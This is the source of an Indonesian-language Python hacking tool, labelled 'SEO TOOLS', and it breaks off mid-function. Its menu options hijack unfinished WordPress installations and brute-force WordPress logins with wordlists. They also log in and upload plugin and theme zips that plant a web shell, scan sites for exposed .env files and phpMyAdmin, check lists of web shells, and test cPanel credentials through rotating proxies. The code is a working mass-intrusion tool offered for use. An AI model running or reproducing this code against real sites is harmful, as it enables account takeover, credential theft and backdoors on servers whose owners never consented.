#KONTOL LU ITEM
try:
	import os, sys, requests, re, json, time, random, mechanize, rich, hashlib
	from datetime import datetime
	from rich import print as rprint
	from rich.panel import Panel
	from rich.table import Table
	from bs4 import BeautifulSoup as par
	from concurrent.futures import ThreadPoolExecutor as pol
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except Exception as e:
	exit("[>] Error: "+str(e)+"\n")

P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"
N = '\x1b[0m'
M, K2 = K, K
BLUE = "\033[0;34m"
END  = "\033[0m"
RED  = "\033[0;31m"
CYAN = "\033[0;36m"

GREEN       = "\033[0;32m"
LIGHT_CYAN  = "\033[1;36m"
LIGHT_WHITE = "\033[1;37m"

password_login = "b8161058979c32ffede3f089285c8b9d" # login (xeotool)
clear = lambda: os.system("clear") if "linux" in sys.platform.lower() else os.system("cls")
wpi, wps, cpr = 0, 0, 0
yes, nos, tots, courl = 0, 0, 0, 0
total_domain = 0
conShell = [
	"-rw-r--r", "drwxr-xr-x", "drwxr-x---", "type='file'", 'type="file"', "type=file",
	"type='password'", 'type="password"', "type=password", "?path=", "?dir=", "&path=", "&dir=", "action='?'", 'action="?"', "action=?",
	"uploader", "upload", "uploads", "shell", "backdoor"
]

def writer(name, content):
	try:
		if content.strip() in open(name, "r").read():
			pass
		else:
			open(name, "a+").write(content.strip().replace("\n","")+"\n")
	except FileNotFoundError:
		open(name, "a+").write(content.strip().replace("\n","")+"\n")

class Grabber:
	def __init__(self):
		self.req = requests.Session()
		self.agent = agent = {"User-Agent":"chrome"}
		self.paths = "result/" + datetime.now().strftime("%m%d%S") + "_"
	def nextTop(self, ajur):
		global total_domain
		myaps = 0
		while True:
			try:
				cek = par(requests.get(ajur+str(myaps), headers=self.agent).text, "html.parser")
				if "<body>" in str(cek):
					finds = re.findall("td.*?<a.*?img.*?>(.*?)<.*?", str(cek))
					for x in finds:
						total_domain += 1
						print("\r> Process (09) Get "+str(total_domain)+" domain available.. ", end="")
						writer(self.paths + "grabber.txt", "http://"+x.strip().replace(" ",""))
					if "Next Page »" in str(cek):
						myaps += 1
					else:
						break
				else:
					break
			except:
				pass
	def Topsite(self):
		app = []
		try:
			cek = par(requests.get("https://www.topsitessearch.com/domains/", headers=self.agent).text, "html.parser")
			for ahr in cek.find_all("a", {"class": "btn btn-secondary"}):
				app.append(ahr.get("href"))
			with pol(max_workers=10) as sub:
				for run in app:
					sub.submit(self.nextTop, run)
		except:
			pass
	def nextGreen(self, ajur):
		global total_domain
		myaps = 0
		while True:
			try:
				cek = par(requests.get(ajur+str(myaps)+"/", headers=self.agent).text, "html.parser")
				if "<body>" in str(cek):
					finds = re.findall("td.*?<a.*?img.*?>(.*?)<.*?", str(cek))
					for x in finds:
						total_domain += 1
						print("\r> Process (08) Get "+str(total_domain)+" domain available.. ", end="")
						writer(self.paths + "grabber.txt", "http://"+x.strip().replace(" ",""))
					if "Next Page »" in str(cek):
						myaps += 1
					else:
						break
				else:
					break
			except:
				pass
	def Greensite(self):
		app = []
		try:
			cek = par(requests.get("https://www.greensiteinfo.com/domain_extensions/", headers=self.agent).text, "html.parser")
			for ahr in cek.find_all("td"):
				app.append(ahr.find("a")["href"])
			with pol(max_workers=10) as sub:
				for run in app:
					sub.submit(self.nextGreen, run)
		except:
			pass
	def whoisSite(self):
		global total_domain
		try:
			cek = par(self.req.get("https://whoisdatacenter.com/free-database/", headers=self.agent).text, "html.parser")
			form = cek.find("form", {"method": "post"})
			param = {}
			for x in form.find_all("input"):
				param.update({x.get("name"): x.get("value")})
			posts = self.req.post(form["action"], headers={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "User-agent":"Chrome"}, data=param).text
			for sui in posts.replace('"DOMAIN NAME"',"").strip().split("\n"):
				total_domain += 1
				print("\r> Process (07) Get "+str(total_domain)+" domain available.. ", end="")
				writer(self.paths + "grabber.txt", "http://"+sui.strip().replace(" ",""))
		except:
			pass
	def Hole1(self):
		global total_domain
		try:
			cek = requests.get("https://hole.cert.pl/domains/domains.csv").text
			for sui in cek.strip().split("\n"):
				sip = re.findall("\d+\s+(.*?)\s+", sui)
				if len(sip) == 0:
					pass
				else:
					total_domain += 1
					print("\r> Process (06) Get "+str(total_domain)+" domain available.. ", end="")
					writer(self.paths + "grabber.txt", "http://"+"".join(sip).strip())
		except:
			pass
	def Hole2(self):
		global total_domain
		try:
			cek = requests.get("https://hole.cert.pl/domains/domains.json").json()
			for x in cek:
				total_domain += 1
				print("\r> Process (05) Get "+str(total_domain)+" domain available.. ", end="")
				writer(self.paths + "grabber.txt", "http://"+x["DomainAddress"])
		except:
			pass
	def Hole3(self):
		global total_domain
		try:
			cek = requests.get("https://hole.cert.pl/domains/domains.txt").text.strip().split("\n")
			for x in cek:
				total_domain += 1
				print("\r> Process (04) Get "+str(total_domain)+" domain available.. ", end="")
				writer(self.paths + "grabber.txt", "http://"+x)
		except:
			pass
	def Hole4(self):
		global total_domain
		try:
			cek = requests.get("https://hole.cert.pl/domains/domains.xml").text
			reg = re.findall("<AdresDomeny>(.*?)</AdresDomeny>", str(cek))
			if len(reg) == 0:
				pass
			else:
				for x in reg:
					total_domain += 1
					print("\r> Process (03) Get "+str(total_domain)+" domain available.. ", end="")
					writer(self.paths + "grabber.txt", "http://"+x.strip())
		except:
			pass
	def Hole5(self):
		global total_domain
		try:
			cek = requests.get("https://hole.cert.pl/domains/domains_adblock.txt").text
			reg = re.findall("\|\|(.*)\^\$all", str(cek))
			if len(reg) == 0:
				pass
			else:
				for x in reg:
					total_domain += 1
					print("\r> Process (02) Get "+str(total_domain)+" domain available.. ", end="")
					writer(self.paths + "grabber.txt", "http://"+x.strip())
		except:
			pass
	def Hole6(self):
		global total_domain
		try:
			cek = requests.get("https://hole.cert.pl/domains/domains_hosts.txt").text
			reg = re.findall("\n\d+\.\d+\.\d+\.\d+\s(.*?)\n", str(cek))
			if len(reg) == 0:
				pass
			else:
				for x in reg:
					total_domain += 1
					print("\r> Process (01) Get "+str(total_domain)+" domain available.. ", end="")
					writer(self.paths + "grabber.txt", "http://"+x.strip())
		except:
			pass
	def gTwo(self, url):
		global total_domain
		head = {"user-agent": "chrome"}
		xd = 0
		while True:
			xd += 1
			val = []
			try:
				cek = par(requests.get(url+str(xd), headers=head).text, "html.parser")
				for grid in cek.find_all("div", {"class":"col-md-4 mb-1 mb-md-0"}):
					value = grid.find("a")
					total_domain += 1
					val.append(value.text)
					urlz = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", str(value.text).replace("https://","").replace("http://",""))][0]

					print("\r> Process (00) Get "+str(total_domain)+" domain available.. ", end="")
					writer(self.paths + "grabber.txt", urlz.strip())
				if len(val) == 0:
					break
			except:
				break
	def gOne(self):
		head = {"user-agent": "chrome"}
		num = 0
		while True:
			num += 1
			param = []

			try:
				cek = par(requests.get("https://www.cubdomain.com/domains-registered-dates/"+str(num), headers=head).text, "html.parser")
				with pol(max_workers=10) as sub:
					for min in cek.find_all("div", {"class":"col-md-4 mb-1 mb-md-0"}):
						value = min.find("a")
						param.append(value.text)
						sub.submit(self.gTwo, value.get("href"))
				if len(param) == 0:
					break
			except:
				break
	def HomeMain(self):
		rich.print("[green]> [/]Hasil akan disimpan ke: [bold green]"+self.paths+"grabber.txt[/]\n")
		self.gOne()
		self.Hole6();self.Hole5();self.Hole4()
		self.Hole3();self.Hole2()
		self.Hole1();self.whoisSite()
		self.Greensite()
		self.Topsite()
		print("\n")

class Press:
	def __init__(self):
		self.ses = requests.Session()
	def autoInstall(self, url, u, p):
		global wpi
		username, email, pw = u.split("@")[0], u, p
		try: self.ses.post(url+"?step=1", data={"language": ""}, allow_redirects=True)
		except: pass
		coy_params = {
			"weblog_title": "".join(re.findall("https?://(\w+)\.", url.replace("www.",""))),
			"user_name": username, "admin_password": p,
			"admin_password2": p, "admin_email": email,
			"blog_public": "0", "Submit": "Instal+WordPress",
			"language": ""
		}
		posts = self.ses.post(url+"?step=2", data=coy_params).text
		so = re.findall("(https?://[^/]+)", url.strip())[0] + "/wp-login.php"
		if "WordPress has been installed" in str(posts) or "WordPress telah diinstal" in str(posts) or "form-table install-success" in str(posts):
			wpi += 1
			rich.print("  -> [green]vuln:[/][white] "+so+"\n     > user: "+username+"\n     > pass: "+p+"\n     > status: [green]success[/]")
			writer(self.paths + "wpinstall.txt", so+"@"+username+"|"+p)
		else:
			rich.print("  -> [green]vuln:[/][white] "+url+"\n     > status: [red]failed installed, try manual[/]")
	def Wpicek(self, data, email, passw):
		try:
			data = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", data)][0] + "/wp-admin/install.php"
			try:
				nicu = par(self.ses.get(data, allow_redirects=True, verify=False).text, "html.parser")
			except:
				pass
			if "admin_password" in str(nicu) or "language-continue" in str(nicu) or "type=\"password\"" in str(nicu) or "type='password'" in str(nicu) or "language-chooser" in str(nicu) or "user-pass2-wrap" in str(nicu):
				self.autoInstall(data, email, passw)
			else:
				rich.print("  -> [red]invalid: [/][white]"+data)
		except:
			rich.print("  -> [red]invalid: [/][white]"+data)
	def RunUpload(self, kuki, url: str = None, method: str = None, file: str = None):
		global wps
		method = ("plugin-install.php" if "plugin" in method else "theme-install.php?browse=popular")
		try:
			cek = par(self.ses.get(url+"/wp-admin/"+method, cookies=kuki).text, "html.parser")
		except:
			cek = par(self.ses.get(url+"/wp-admin/"+method, cookies=kuki).text, "html.parser")
		form = cek.find("form", {"enctype": "multipart/form-data", "class": "wp-upload-form"})
		if form:
			payload = {
				x.get("name"): x.get("value")
				for x in form.findAll("input", {"type": ["hidden", "submit"]})
			}
			files = {"pluginzip" if "plugin" in method else "themezip": open(file, "rb")}
			self.ses.post(form.get("action"), data=payload, files=files, cookies=kuki)
			result = f"{url}/wp-content/{'plugins/sphinx' if 'plugin' in method else 'themes/theme'}/class-autoload.php"
			writer(self.paths + "upshell.txt", result)
			rich.print("  -> [green]success:[/][white] "+result)
			wps += 1
		else:
			rich.print("  -> [red]failed:[/][white] "+url)
	def Wpupshell(self, url, u, p):
		ukhs = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)][0]
		conts = self.ses.get(url+"/wp-login.php", allow_redirects=True)
		url = re.findall("(https?://.*?/)", conts.url)[0]

		logs = par(conts.text, "html.parser")
		if "captcha" in str(logs):
			rich.print("  [red]-> captcha:[/][yellow] "+url)
		else:
			forms = logs.find("form", {"method": "post"})
			payload = {}
			try:
				for inp in forms.find_all("input"):
					payload.update({inp.get("name"): inp.get("value")})
				payload.update({"log": u, "pwd": p})
				if forms.get("action") is None:
					usl = url + "/wp-login.php"
				else:
					usl = forms.get("action")
				tring = self.ses.post(usl, data=payload, allow_redirects=True).text
				if "menu-dashboard" in str(tring) or "wpadminbar" in str(tring):
					plugin = self.RunUpload(self.ses.cookies.get_dict(), url=url, method="plugin", file="assets/sphinx.zip")
					theme = self.RunUpload(self.ses.cookies.get_dict(), url=url, method="theme", file="assets/theme.zip")
				else:
					rich.print("  -> [red]failed:[/][white] "+url)
			except AttributeError:
				rich.print("  -> [red]failed:[/][white] "+url)
	def runCrack(self, url, user, pw):
		global yes, nos, tots, courl
		agent = {"user-agent": "chrome"}
		usegx = re.findall("www.([^./]+)" if "www." in url else "https?://([^./]+)", url)[0]
		group_domain = re.findall("www.([^/]+)" if "www." in url else "https?://([^/]+)", url)[0].replace(".","")
		with requests.Session() as sub:
			for ps in pw:
				try:
					ps = (ps.replace("[WPLOGIN]", user).replace("[DDOMAIN]", group_domain)
					.replace("[DOMAIN]", usegx)
					.replace("[UPPERALL]", user.upper())
					.replace("[LOWERALL]", user.lower())
					.replace("[UPPERONE]", user.capitalize())
					.replace("[LOWERONE]", user[0].lower() + user[1::].upper())
					.replace("[AZDOMAIN]", group_domain)
					.replace("[UPPERLOGIN]", user.capitalize())
					)
					logs = par(sub.get(url+"/wp-login.php", headers=agent, allow_redirects=True).text, "html.parser")
					if "Captcha" in str(logs) or "imunify" in str(logs):
						nos += 1
						writer("result/wordpress.txt", url+"/wp-login.php")
						break
					else:
						forms = logs.find("form", {"method": "post"})
						payload = {}
						try:
							for inp in forms.find_all("input"):
								payload.update({inp.get("name"): inp.get("value")})
							payload.update({"log": user, "pwd": ps})
							if forms.get("action") is None:
								usl = url + "/wp-login.php"
							else:
								usl = forms.get("action")
							tring = sub.post(usl, data=payload, allow_redirects=True).text
							if "menu-dashboard" in str(tring) or "wpadminbar" in str(tring):
								yes += 1
								rich.print("\n  -> [green]success:[/] "+url+"@"+user+"#"+ps, end="\n")
								writer("result/wpcrack.txt", url+"/wp-login.php@"+user+"#"+p)
								break
							else:
								writer("result/wordpress.txt", url+"/wp-login.php")
								nos += 1
						except AttributeError:
							nos += 1
							writer("result/wordpress.txt", url+"/wp-login.php")
							break
						except requests.exceptions.ConnectionError:
							nos += 1
							writer("result/wordpress.txt", url+"/wp-login.php")
							break
				except:
					nos += 1
				percent = (courl / tots) * 100
				print(f"\r[progress: {percent:.2f}%][vuln:-{yes}][notvuln:-{nos}] proses cracking... ", end="")
	def crack(self, url, pws):
		global courl, nos
		agent = {"user-agent": "chrome"}
		try:
			check = requests.get(url+"/wp-json/wp/v2/users", headers=agent, allow_redirects=True)
			if check.status_code == 200:
				user = [x["slug"] for x in check.json()]
			else:
				user = []
		except:
			user = []

		if len(user) != 0:
			url = re.findall("(https?://[^/]+)", check.url)[0]
			with pol(max_workers=20) as pul:
				for usr in user:
					courl += 1
					pul.submit(self.runCrack, url, usr, pws)
		else:
			courl += 1
	def respon(self, url):
		url = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)][0]
		try:
			check = requests.get(url, allow_redirects=True, headers={"User-Agent": "chrome"})
			sts = "[green]"+str(check.status_code)+"ok[/]" if str(check.status_code) == "200" else str(check.status_code)+"[/]"
			rich.print("  -> "+sts+": "+str(check.url))
			writer(self.paths + "cekresp.txt", str(check.url))
		except:
			rich.print("  -> [red]error:[/][white] "+str(url))
	def subScan(self, url):
		chois = open("assets/user-agents.txt","r").read().strip().split("\n")
		head = {'User-Agent': random.choice(chois)}
		regs = re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)[0]
		data = {
			"url": regs,"versi": "1",
			"go": "Gaskeun"
		}
		fetch = []
		coos = par(requests.post("http://v1.exploits.my.id/?tools=subdomain", data=data).text, "html.parser")
		while "Akhir akhir ini akses server terasa berat" in str(coos):
			coos = par(requests.post("http://v1.exploits.my.id/?tools=subdomain", data=data).text, "html.parser")
		texts = coos.find("textarea", {"id": "select"})
		if texts is not None:
			for x in texts.text.strip().split("\n"):
				cuy = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", str(x))][0]
				fetch.append(cuy)
		else:
			cek = requests.get("https://rapiddns.io/subdomain/"+regs+"?full=1#result", headers=head).text
			fetch = re.findall("</th>\n<td>(.*?)</td>", str(cek))
		if len(fetch) == 0:
			rich.print("  -> [red]status:[/] Subdomain tidak terdeteksi, kemungkinan koneksi/tidak ada subdomain")
		else:
			with pol(max_workers=10) as sub:
				for xs in fetch:
					sub.submit(self.respon, xs)
	def revhost(self, urls):
		url = re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", urls)[0]
		chois = open("assets/user-agents.txt","r").read().strip().split("\n")
		head = {'User-Agent': random.choice(chois)}
		ya = 0

		try:
			cek = requests.get("https://rapiddns.io/sameip/"+url+"?full=1#result", headers=head).text
			finds = re.findall("</th>\n<td>(.*?)</td>", str(cek))
		except:
			finds = []

		cek2 = requests.get("https://api.hackertarget.com/reverseiplookup/?q="+url, headers=head) #.text.strip().split("\n")
		if cek2.status_code == 200:
			if "API count exceeded" not in str(cek2[0]):
				cekg = cek2.text.strip().split("\n")
				for yz in cekg:
					finds.append(yz)

		try:
			cek3 = requests.post("https://domains.yougetsignal.com/domains.php", data={"remoteAddress": url}, headers=head).json() #["domainArray"]
			try:
				while 'Service unavailable.' in cek3["message"]:
					cek3 = requests.post("https://domains.yougetsignal.com/domains.php", data={"remoteAddress": url}, headers=head).json()
				if "Daily reverse IP" in cek3["message"]:
					pass
				else:
					for xys in cek3["domainArray"]:
						finds.append(xys[0])
			except:
				for xys in cek3["domainArray"]:
					finds.append(xys[0])
		except:
			pass

		rich.print("  [green]->[/] result: "+url+" [[green]"+str(len(finds))+" [/]Domain]")
		for yy in finds:
			ya += 1
			sho = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", yy.replace("https://","").replace("http://",""))][0]
			writer(self.paths + "reverse.txt", sho)
	def pmaCek(self, url, dir):
		ok = 0
		for yz in dir:
			try:
				cek = requests.get(url+"/"+yz, headers={"user-agent":"chrome"}, allow_redirects=False)
				if cek.status_code == 200:
					#if "pma_password" in cek.text or "pma_password" in str(cek):
					ok += 1
					print("\r     \x1b[1;94mPhpMyAdmin:\x1b[1;00m "+url+"/"+yz, end="\n")
					writer(self.paths + "envscan.txt", url+"/"+yz)
					break
				else:
					pass
			except:
				pass
			print("\r     Scanning: \x1b[1;93m"+yz+"\x1b[1;00m\t ", end="")
		if int(ok) == 0:
			print("\r     scanning: \x1b[1;91mnot found!\x1b[1;00m\t")
	def envScan(self, url):
		usl = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)][0]
		try:
			cek = requests.get(usl+"/.env", allow_redirects=True, headers={"user-agent": "chrome"})
			if cek.status_code == 200:
				if "APP_URL" in cek.text and "DB_CONNECTION" in cek.text and "DB_USERNAME" in cek.text:
					rich.print("  -> [green]vuln:[/] "+url+"/.env")
					dirPma = open("assets/dirPMA.txt","r").read().strip().split("\n")
					with pol(max_workers=15) as pols:
						pla = cek.url
						pols.submit(self.pmaCek, pla.replace("/.env",""), dirPma)
				else:
					rich.print("  -> [red]notvuln:[/] "+url+"/.env")
			else:
				rich.print("  -> [red]notvuln:[/] "+url+"/.env")
		except:
			rich.print("  -> [red]notvuln:[/] "+url+"/.env")
	def adminFinder(self, urls, x):
		for usk in x:
			url = urls+"/"+usk
			try:
				check = requests.get(url, allow_redirects=True, headers={"User-Agent": "chrome"})
				if "<title>Captcha</title>" in str(check.text):
					rich.print("  -> [red]captcha:[/][white] "+str(url))
					break
				else:
					sts = "[green]"+str(check.status_code)+"ok[/]" if str(check.status_code) == "200" else str(check.status_code)+"[/]"
					rich.print("  -> "+sts+": "+str(url))
			except:
				rich.print("  -> [red]error:[/][white] "+str(url))
	def shellScan(self, url):
		global conShell
		try:
			cek = requests.post(url, headers={"user-agent":"chrome"}, allow_redirects=True).text
			if cek in conShell:
				writer(self.paths + "shellscan.txt", url)
				rich.print("  -> [green]valid:[/][white] "+url)
			else:
				rich.print("  -> [red]invalid:[/][white] "+url)
		except:
			rich.print("  -> [red]invalid:[/][white] "+url)
	def cpcrack(self, url, u, p):
			proxy = open("session/.prox","r").read().strip().split("\n")
			rands = "socks5://"+random.choice(proxy)

			gets = requests.get(url, headers={"user-agent": "chrome"}, allow_redirects=True)
			if gets.status_code != 200:
				rich.print("  -> [red]invalid:[/][white] "+url+"|"+u+"|"+p)
			else:
				br = mechanize.Browser()
				br.set_proxies({"http": rands})
				br.set_handle_equiv(False)
				br.set_handle_robots(False)
				br.set_handle_referer(True)
				br.addheaders = [('User-Agent', 'chrome'), ('Connection', 'keep-alive'), ('Accept', '*/*')]
				try:
					br.open(gets.url)
				except:
					rich.print("  -> [red]invalid:[/][white] "+url+"|"+u+"|"+p)
				try:
					br.select_form(nr=1)
					br["user"] = u
					br["pass"] = p
					resp = br.submit()
					rich.print("  -> [green]valid: [/][white]"+url+"|"+u+"|"+p)
					writer(self.paths + "cpcheck.txt", url+"|"+u+"|"+p)
				except:
					rich.print("  -> [red]invalid:[/][white] "+url+"|"+u+"|"+p)



class Word(Press):
	def __init__(self):
		self.ses = requests.Session()
		self.ses.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
		self.paths = "result/" + datetime.now().strftime("%m%d%S") + "_"
	def checks(self):
		while True:
			fls = input("> Insert File: ")
			try:
				if fls in [".jpg",".jpeg",".png",".svg",".webp",".mp4",".mp3",".pdf"]:
					check = open(fls, "rb")
				else:
					check = open(fls, "r").read().strip().split("\n")
				break
			except:
				continue
		return check
	def Ashell(self):
		tnya = input("> Ingin massal/single? [M/S]: ")
		while tnya not in list("MmSs"):
			rich.print("  [red]*>[/] Pilihan tidak tersedia..")
			tnya = input("> Ingin massal/single? [M/S]: ")
		if tnya in list("Mm"):
			while True:
				file = input("> Masukan file: ")
				try:
					cek = open(file,"r").read().strip().split("\n")
					break
				except:
					rich.print("[red]*>[/] File tidak ditemukan")
			return cek
		else:
			trget = input("> Target site/hostname: ")
			while trget == "":
				trget = input("> Target site/hostname: ")
			return trget.split()
	def inputs(self, text, type=None):
		if type is None:
			check = input(text)
			while check.strip() == "":
				check = input(text)
			return check
		elif type == "int":
			check = input(text)
			while not check.isdigit() or check.strip() == "":
				check = input(text)
			return check
		elif type == "email":
			check = input(text)
			while "@" not in check or check == "":
				check = input(text)
			return check
	def Privword(self):
		tnya = input("> Wordlist Manual/Auto? [M/A]: ")
		while tnya not in list("MmAa"):
			rich.print("   [red]*[/] Pilihan tidak tersedia..")
			tnya = input("> Wordlist Manual/Auto? [D/A]: ")
		if tnya in list("Mm"):
			while True:
				file = input("> Wordlist File: ")
				try:
					cek = open(file,"r").read().strip().split("\n")
					break
				except:
					rich.print(" [red]*[/] File tidak ditemukan")
			return cek
		else:
			ckck = open("assets/top_pass.txt","r").read().strip().split("\n")
			return ckck
	def Main(self, page: str = None):
		global tots
		if page in ["1","01"]:
			ask = self.checks()
			email = self.inputs("> Masukan email: ", type="email")
			passw = self.inputs("> Masukan password: ", type=None)
			print("")
			with pol(max_workers=10) as sub:
				for inits in ask:
					sub.submit(self.Wpicek, inits, email, passw)
			if int(wpi) != 0:
				rich.print("\n[green]>[/] Hasil disimpan di: [bold green]"+self.paths+"wpinstall.txt[/]\n")
			else:
				rich.print("\n[red]>[/] Proses selesai. tidak ada hasil!\n")
			input(">> ENTER UNTUK KEMBALI! <<");main()
		elif page in ["2","02"]:
			rich.print("[blue]!! [/]File target domain harus berisi: [green]url[white]@[green]user[white]|[green]pass")
			ask = self.Ashell()
			print("")
			try:
				with pol(max_workers=10) as mid:
					for cy in ask:
						url, user, pw = re.findall("(https?://.*?)\@(.*?)\|(.*)", str(cy))[0]
						mid.submit(self.Wpupshell, url, user, pw)
			except IndexError:
				exit(rich.print("\n[red]>[/] Kesalahan dalam pemformatan isi file / url tersebut!\n"))
			if int(wps) != 0:
				rich.print("\n[green]>[/] Hasil disimpan di: [bold green]"+self.paths+"upshell.txt[/]\n")
			else:
				rich.print("\n[red]>[/] Proses selesai. tidak ada hasil!\n")
			input(">> ENTER UNTUK KEMBALI! <<");main()
		elif page in ["3","03"]:
			rich.print("> Hasil disimpan di: [green]result/wpcrack.txt[/]")
			tnya = input("> Bruteforce Target/Massal [T/M]: ")
			while tnya not in list("TtMm"):
				tnya = input("> Bruteforce Target/Massal [T/M]: ")
			if tnya in list("Tt"):
				target = input("> Target website: ")
				while target == "":
					target = input("> Target website: ")
				dataPw = self.Privword()
				url = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", target)]
			else:
				while True:
					fls = input("> List file target: ")
					try:
						trg = open(fls, "r").read().strip().split("\n")
						break
					except:
						rich.print("   [red]*[/] File tidak tersedia")
				dataPw = self.Privword()
				url = []
				for x in trg:
					try:
						asu = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", x)][0]
						url.append(asu)
					except:
						pass
			print("! Proses cracking membutuhkan waktu..\n")
			tots += len(url)
			for xr in url:
				self.crack(xr, dataPw)
			input("\n\n>> ENTER UNTUK KEMBALI! <<");main()
		elif page in ["4","04"]:
			rich.print("[blue]!![/] Proses pengumpulan site dimulai, mungkin ini memakan waktu yang cukup lama!")
			Grabber().HomeMain()
			input("\n\n>> ENTER UNTUK KEMBALI! <<");main()
		elif page in ["5","05"]:
			ask = self.Ashell()
			rich.print("[green]>[/] Result akan disimpan di: [bold green]"+self.paths + "cekresp.txt[/]\n")
			for x in ask:
				self.subScan(x)
			input("\n>> ENTER UNTUK KEMBALI! <<");main()
		elif page in ["6","06"]:
			rich.print("[bold yellow]NOTE:[/] anda bisa memasukan file/inputan yang berisi IP/HOSTNAME")
			rich.print("[blue]!![/] Result akan disimpan ke: [bold green]"+self.paths + "reverse.txt[/]")
			ask = self.Ashell()
			print("")
			with pol(max_workers=10) as sub:
				for xy in ask:
					sub.submit(self.revhost, xy)
			rich.print("\n[red]>[/] Proses selesai...")
			input(">> ENTER UNTUK KEMBALI! <<");main()
		elif page in ["7","07"]:
			rich.print("[bold yellow]NOTE:[/] Untuk masal, file harus berisi link/url")
			rich.print("[blue]!! [/]Result akan disimpan ke: "+self.paths + "envscan.txt")
			ask = self.Ashell()
			print("")
			for x in ask:
				self.envScan(x)
			rich.print("\n[red]>[/] Proses selesai...")
			input(">> ENTER UNTUK KEMBALI! <<");main()
		elif page in ["8","08"]:
			rich.print("[bold yellow]NOTE: [/]URL Target harus diawali dengan [green]https://[/] atau [green]http://[/]")
			target = input("> Target situs: ")
			while target == "":
				rich.print("  [red]*[/] target harys diisi")
				target = input("> Target situs: ")

			path = input("> DIR manual atau auto? [M/A]: ")
			while path not in list("MmAa"):
				rich.print("  [red]*[/] opsi tidak ada")
				path = input("> DIR manual atau auto? [M/A]: ")
			if path in list("Mm"):
				while True:
					fls = input("> File path: ")
					try:
						cek = open(fls, "r").read().strip().split("\n")
						break
					except:
						rich.print("  [red]*[/] File tidak tersedia")
			else:
				cek = open("assets/dirADMIN.txt", "r").read().strip().split("\n")
			print("")
			with pol(max_workers=10) as sub:
				sub.submit(self.adminFinder, target, cek)
			rich.print("\n[red]>[/] Proses selesai...")
			input(">> ENTER UNTUK KEMBALI! <<");main()
		elif page in ["9","09"]:
			rich.print("[bold yellow]NOTE:[/] Ini hanya shell scanner, file/url wajib seperti [green]https://url/shell.php[/] dan ini bukan shell finder yaa")
			rich.print("[blue]!![/] Result akan disimpan ke: [bold green]"+self.paths + "shellscan.txt[/]")
			ask = self.Ashell()
			print("")
			with pol(max_workers=10) as sub:
				for us in ask:
					sub.submit(self.shellScan, us)
			rich.print("\n[red]>>[/] Proses selesai...")
			input(">> ENTER UNTUK KEMBALI! <<");main()
		elif page == "10":
			rich.print("[blue]!! [/]File harus berisi dengan [green]url[white]|[green]username[white]|[green]password")
			rich.print("[green]>[/] Hasil disimpan di: [bold green]"+self.paths+"cpcheck.txt[/]")
			ask = self.Ashell()
			print("")
			with pol(max_workers=10) as sub:
				for xs in ask:
					url, user, pw = xs.split("|")
					sub.submit(self.cpcrack, url, user, pw)
			input("\n>> ENTER UNTUK KEMBALI! <<");main()
		elif page in ["0","00"]:
			exit("* Semoga harimu menyenangkan. Bye..\n")

def Me():
       print(r'''╔═╗╔═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╔═╗  welcome
╚═╗║╣ ║ ║   ║ ║ ║║ ║║  ╚═╗  %screate by RyotaXD
╚═╝╚═╝╚═╝   ╩ ╚═╝╚═╝╩═╝╚═╝  %ssimpel bruteforce %sv1.0%s
       '''%(P,H,P,P))

def main():
	clear()
	Me()
	table = Table(title="",style="")
	table.add_column("NO", justify="right", style="cyan", no_wrap=True)
	table.add_column("MENU : [green]NEW SEO TOOLS ONLINE")
	table.add_column("STATUS", justify="right", style="green")
	table.add_row("01", "WP INSTALL CHECKER + AUTO INSTALL", "ONLINE")
	table.add_row("02", "WP AUTO UPLOAD SHELL [green]NEW", "ONLINE")
	table.add_row("03", "WP BRUTE FORCE [green]NEW", "ONLINE")
	table.add_row("04", "GRABBER SITE [green]NEW", "ONLINE")
	table.add_row("05", "AUTO SUBDOMAIN FINDER", "ONLINE")
	table.add_row("06", "REVERSE IP ATAU DOMAIN", "ONLINE")
	table.add_row("07", "ENV PHPMYADNIN SCANNER", "ONLINE")
	table.add_row("08", "ADMIN PATH FINDER", "ONLINE")
	table.add_row("09", "SHELL SCANNER [green]NEW", "ONLINE")
	table.add_row("10", "CPANEL CHECKER", "ONLINE")
	table.add_row("00", "EXIT TOOLS SEO", "ONLINE")
	rprint(Panel.fit(table))
	pilih = input("Input: ")
	while not pilih.isdigit() or int(pilih) > 10:
		rich.print("[bold red]*>[/] pilihan tidak tersedia")
		pilih = input("Input: ")
	Word().Main(page=pilih)


def check_assets_path():
    ldir = lambda dir: os.listdir(dir)
    rich.print("[bold green][>] [/]Sedang menyiapkan persiapan alat")

    # Pastikan direktori 'session' ada
    if not os.path.exists("./session"):
        os.makedirs("./session")
        rich.print("[bold yellow][!] [/]Direktori 'session' dibuat.")

    # Cek apakah file proxy (.prox) sudah ada di sesi
    if ".prox" in ldir("./session"):
        rich.print("[bold blue][>] [/]File proxy (.prox) sudah ditemukan, melanjutkan ke main().")
        main()
    else:
        # Jika belum ada, mulai proses pengambilan proxy
